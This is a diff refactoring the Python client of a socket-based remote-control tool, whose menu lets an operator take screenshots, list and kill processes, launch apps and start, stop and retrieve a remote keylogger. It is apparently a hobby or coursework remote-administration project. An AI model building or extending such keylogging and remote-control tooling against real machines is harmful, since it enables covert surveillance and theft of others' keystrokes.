@@ -57,60 +57,53 @@ class Client:
           pass
     # Command Line Interface
 
-    def run(self):
-      while True:
-        print('''Commands:
-        1: Take screenshot
-        2: View processes
-        3: View apps
-        4: Kill process/app
-        5: Start app
-        6: Start process
-        7: Start key logger
-        8: Stop key logger
-        9: Print key logger
-        10: Shutdown
-        0: Exit''')
-        cmd = input('Enter command: ')
-      
-        try:
-          if cmd == '1':
-            self.take_screenshot()
-            self.save_file(TMP_PATH, 'screenshot.png')
-          elif cmd == '2':
-            self.view_processes()
-          elif cmd == '3':
-            self.view_apps()
-          elif cmd == '4':
-            pid = input('Enter pid: ')
-            self.kill_process(pid)
-          elif cmd == '5':
-            app_name = input('Enter app name: ')
-            self.start_app(app_name)
-          elif cmd == '6':
-            pass
-          elif cmd == '7':
-            self.start_keylogger()
-          elif cmd == '8':
-            self.stop_keylogger()
-          elif cmd == '9':
-            self.print_keylogger()
-          elif cmd == '10':
-            self.shutdown()
-            break
-          elif cmd == '0':
-            print("[EXIT] Exiting...")
-            break
-        except ConnectionResetError:
-          print("[ERROR] Connection reset")
-          exit()
-
-  def shutdown(self):
-    self.socket.send(CMD_SHUTDOWN.encode())
-    print("[SHUTDOWN] Disconnected from server")
-
-  def take_screenshot(self):
-    self.socket.send(CMD_TAKE_SCREENSHOT.encode())
+  def run(self):
+    while True:
+      print('''Commands:
+      1: Take screenshot
+      2: View processes
+      3: View apps
+      4: Kill process/app
+      5: Start app
+      6: Start process
+      7: Start key logger
+      8: Stop key logger
+      9: Print key logger
+      10: Shutdown
+      0: Exit''')
+      cmd = input('Enter command: ')
+    
+      try:
+        if cmd == '1':
+          self.take_screenshot()
+          self.save_file(TMP_PATH, 'screenshot.png')
+        elif cmd == '2':
+          self.view_processes()
+        elif cmd == '3':
+          self.view_apps()
+        elif cmd == '4':
+          pid = input('Enter pid: ')
+          self.kill_process(pid)
+        elif cmd == '5':
+          app_name = input('Enter app name: ')
+          self.start_app(app_name)
+        elif cmd == '6':
+          pass
+        elif cmd == '7':
+          self.start_keylogger()
+        elif cmd == '8':
+          self.stop_keylogger()
+        elif cmd == '9':
+          self.print_keylogger()
+        elif cmd == '10':
+          self.shutdown()
+          break
+        elif cmd == '0':
+          print("[EXIT] Exiting...")
+          break
+      except ConnectionResetError:
+        print("[ERROR] Connection reset")
+        exit()
 
   def save_file(self, path, file_name):
     with open(os.path.join(path, file_name), 'wb') as f:
@@ -120,67 +113,53 @@ class Client:
           break
         else:
           f.write(data)
-
-  def start_keylogger(self):
-    self.socket.send(CMD_START_KEYLOGGER.encode())
+  
+  def recv_msg(self, flag):
     msg = ""
     while True:
       data = self.socket.recv(BUFFER_SIZE)
-      if data == FLAG_MSG_END.encode():
+      if data == flag.encode():
         break
       else:
         msg += data.decode()
+    return msg
+
+  def shutdown(self):
+    self.socket.send(CMD_SHUTDOWN.encode())
+    print("[SHUTDOWN] Disconnected from server")
+
+  def take_screenshot(self):
+    self.socket.send(CMD_TAKE_SCREENSHOT.encode())
+
+  def start_keylogger(self):
+    self.socket.send(CMD_START_KEYLOGGER.encode())
+    msg = self.recv_msg(FLAG_MSG_END)
     return msg
 
   def stop_keylogger(self):
     self.socket.send(CMD_STOP_KEYLOGGER.encode())
-    msg = ""
-    while True:
-      data = self.socket.recv(BUFFER_SIZE)
-      if data == FLAG_MSG_END.encode():
-        break
-      else:
-        msg += data.decode()
+    msg = self.recv_msg(FLAG_MSG_END)
     return msg
 
   def print_keylogger(self):
     self.socket.send(CMD_PRINT_KEYLOGGER.encode())
-    keys = ""
-    while True:
-      data = self.socket.recv(BUFFER_SIZE)
-      if data == FLAG_FILE_END.encode():
-        break
-      else:
-        keys += data.decode()
+    keys = self.recv_msg(FLAG_FILE_END)
     return keys
 
   def view_processes(self):
     self.socket.send(CMD_VIEW_PROCESSES.encode())
-    processes = ""
-    while True:
-      data = self.socket.recv(BUFFER_SIZE)
-      if data == FLAG_PROCESSES_END.encode():
-        break
-      else:
-        processes += data.decode()
-        
+    processes = self.recv_msg(FLAG_PROCESSES_END)
     return processes
       
+  def view_apps(self):
+    self.socket.send(CMD_VIEW_APPS.encode())
+    apps = self.recv_msg(FLAG_APPS_END)
+    return apps
+
   def kill_process(self, pid):
     self.socket.send(CMD_KILL_PROCESS.encode())
     time.sleep(0.01)
     self.socket.send(str(pid).encode())
-  
-  def view_apps(self):
-    self.socket.send(CMD_VIEW_APPS.encode())
-    apps = ""
-    while True:
-      data = self.socket.recv(BUFFER_SIZE)
-      if data == FLAG_APPS_END.encode():
-        break
-      else:
-        apps += data.decode()
-    return apps
 
   def start_app(self, app_name):
     self.socket.send(CMD_START_APP.encode())
@@ -189,19 +168,3 @@ class Client:
 
   def end_connection(self):
     self.socket.send(CMD_END_CONNECTION.encode())
-    
-  def view_apps(self):
-    self.socket.send(CMD_VIEW_APPS.encode())
-    apps = ""
-    while True:
-      data = self.socket.recv(BUFFER_SIZE)
-      if data == FLAG_APPS_END.encode():
-          break
-      else:
-          apps += data.decode()
-    return apps
-
-def start_app(self, app_name):
-  self.socket.send(CMD_START_APP.encode())
-  time.sleep(0.01)
-  self.socket.send(app_name.encode())
